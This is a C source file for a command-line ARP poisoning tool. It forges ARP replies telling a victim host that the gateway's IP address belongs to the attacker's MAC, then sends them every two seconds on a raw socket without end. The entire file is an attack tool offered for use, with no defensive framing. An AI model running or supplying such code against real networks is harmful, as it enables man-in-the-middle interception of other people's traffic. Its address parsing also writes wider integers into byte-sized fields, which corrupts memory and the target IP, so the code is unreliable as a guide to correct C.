#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/socket.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <signal.h>

#define IP4LEN 4
#define PKTLEN sizeof(struct ether_header) + sizeof(struct ether_arp)

int main(int argc, char **argv) {
    int sd;
    char packet[PKTLEN];
    u_char dmb[6];
    u_long dib[4];
    struct ether_header * eth = (struct ether_header *) packet;
    struct ether_arp * arp = (struct ether_arp *) (packet + sizeof(struct ether_header));
    struct sockaddr_ll device;

    if (argc != 5) {
      printf("Incorrect Number of arguemnts\n");
      printf("Usage: ./arp_poison GatewayIP AttackerMAC VictimIP VictimMAC\n");
      exit(1);
    }

    // Create socket to arp poison
    if ((sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
      perror("socket");
      exit(1);
    }

    // Read MAC address of attacker into source MAC addres of ARP packet
    sscanf(argv[2], "%x:%x:%x:%x:%x:%x",  (unsigned int *) &arp->arp_sha[0],
                      (unsigned int *) &arp->arp_sha[1],
                      (unsigned int *) &arp->arp_sha[2],
                      (unsigned int *) &arp->arp_sha[3],
                      (unsigned int *) &arp->arp_sha[4],
                      (unsigned int *) &arp->arp_sha[5]);

    // Read MAC address of victim into buffer.
    sscanf(argv[4], "%x:%x:%x:%x:%x:%x",  (unsigned int *) &dmb[0],
                      (unsigned int *) &dmb[1],
                      (unsigned int *) &dmb[2],
                      (unsigned int *) &dmb[3],
                      (unsigned int *) &dmb[4],
                      (unsigned int *) &dmb[5]);

    // Read IP address of gateway into source
    sscanf(argv[1], "%d.%d.%d.%d", (int *) &arp->arp_spa[0],
                                   (int *) &arp->arp_spa[1],
                                   (int *) &arp->arp_spa[2],
                                   (int *) &arp->arp_spa[3]);

    // Read IP address of victim into buffer.
    sscanf(argv[3], "%d.%d.%d.%d", (int *) &dib[0],
                                   (int *) &dib[1],
                                   (int *) &dib[2],
                                   (int *) &dib[3]);



    // Read MAC address of victim into ethernet destination.
    memcpy(eth->ether_dhost, dmb, ETH_ALEN);
    // Read MAC address of attacker into ethernet source.
    memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN);
    eth->ether_type = htons(ETH_P_ARP);

    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(ETH_P_IP);
    arp->ea_hdr.ar_hln = ETH_ALEN;
    arp->ea_hdr.ar_pln = IP4LEN;
    arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
    // Read MAC address of victim into ARP MAC target.
    memcpy(arp->arp_tha, dmb, ETH_ALEN);
    // Read IP address of victim into ARP IP target.
    memcpy(arp->arp_tpa, dib, IP4LEN);

    memset(&device, 0, sizeof(device));
    device.sll_ifindex = if_nametoindex("eno1");
    device.sll_family = AF_PACKET;
    memcpy(device.sll_addr, arp->arp_sha, ETH_ALEN);
    device.sll_halen = htons(ETH_ALEN);

    while (1) {
      printf("Poisoning: %s -> %s is at %s\n", argv[3], argv[1], argv[2]);
      sendto(sd, packet, PKTLEN, 0, (struct sockaddr *) &device, sizeof(device));
      sleep(2);
    }
    return 0;
}
